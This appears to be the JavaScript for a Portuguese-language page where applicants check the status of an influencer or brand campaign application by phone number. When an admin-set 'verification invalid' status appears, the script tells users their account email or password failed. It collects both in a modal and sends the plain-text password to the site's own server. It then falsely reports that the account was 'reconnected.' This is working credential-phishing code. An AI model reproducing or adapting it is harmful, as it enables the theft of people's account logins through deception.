let currentCandidaturaId = null;

document.addEventListener('DOMContentLoaded', () => {
  lucide.createIcons();
});

async function checkStatus(e) {
  e.preventDefault();
  const telefone = document.getElementById('check-telefone').value.trim();
  if (!telefone) return;

  const btn = document.getElementById('btn-check');
  btn.disabled = true;
  btn.innerHTML = 'Buscando...';

  try {
    const res = await fetch('php/check.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ telefone })
    });
    const data = await res.json();

    if (!data.success) {
      alert(data.message);
      document.getElementById('status-result').style.display = 'none';
    } else {
      showResult(data.data);
    }
  } catch (error) {
    alert('Erro de conexão com o servidor.');
  }

  btn.disabled = false;
  btn.innerHTML = '<i data-lucide="arrow-right"></i> Consultar Status';
  lucide.createIcons();
}

function showResult(c) {
  currentCandidaturaId = c.id;
  document.getElementById('res-nome').textContent = c.nome_completo;
  document.getElementById('res-campanha').textContent = `${c.campanha_nome} (${c.campanha_marca})`;

  const badge = document.getElementById('res-badge');
  badge.className = `badge-status status-${c.status}`;

  const labels = {
    pendente: 'Pendente',
    em_analise: 'Em Análise',
    aprovado: 'Aprovado',
    reprovado: 'Reprovado',
    rweb_invalida: 'Verificação Inválida'
  };

  badge.innerHTML = `<i data-lucide="${c.status === 'aprovado' ? 'check-circle' : c.status === 'rweb_invalida' ? 'alert-triangle' : 'clock'}"></i> ${labels[c.status] || c.status}`;

  const alertBox = document.getElementById('rweb-alert-box');
  if (c.status === 'rweb_invalida') {
    alertBox.style.display = 'block';
    const defaultMsg = 'Não foi possível validar a autenticidade da sua conta. O e-mail ou a senha informados estão incorretos ou a sessão expirou. Por favor, faça a verificação novamente para prosseguir com sua candidatura.';
    document.getElementById('res-nota').innerHTML = c.nota_admin || defaultMsg;
  } else {
    alertBox.style.display = 'none';
  }

  document.getElementById('status-result').style.display = 'block';
  lucide.createIcons();
}

function openConnectModal() {
  document.getElementById('modal-connect').style.display = 'flex';
}

function closeConnectModal(e) {
  if (e && e.target !== document.getElementById('modal-connect')) return;
  document.getElementById('modal-connect').style.display = 'none';
}

function toggleConnectPass() {
  const input = document.getElementById('connect-password');
  const icon = document.getElementById('eye-connect');
  if (input.type === 'password') {
    input.type = 'text';
    icon.setAttribute('data-lucide', 'eye-off');
  } else {
    input.type = 'password';
    icon.setAttribute('data-lucide', 'eye');
  }
  lucide.createIcons();
}

async function confirmConnect() {
  const handle = document.getElementById('connect-handle').value.trim();
  const password = document.getElementById('connect-password').value.trim();

  if (!handle || !password) {
    alert('Preencha os campos de e-mail e senha da conta.');
    return;
  }

  try {
    await fetch('php/connections.php?action=save', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        rweb_usuario: handle,
        rweb_senha: password,
        candidatura_id: currentCandidaturaId
      })
    });

    closeConnectModal();
    alert('Sua conta foi reconectada com sucesso! Aguarde cerca de 5 minutos e cheque novamente o status da sua candidatura nesta página para ver se foi aprovado(a).');

    // Refresh status automatically
    document.getElementById('btn-check').click();

  } catch (error) {
    alert('Erro ao reconectar a conta.');
  }
}
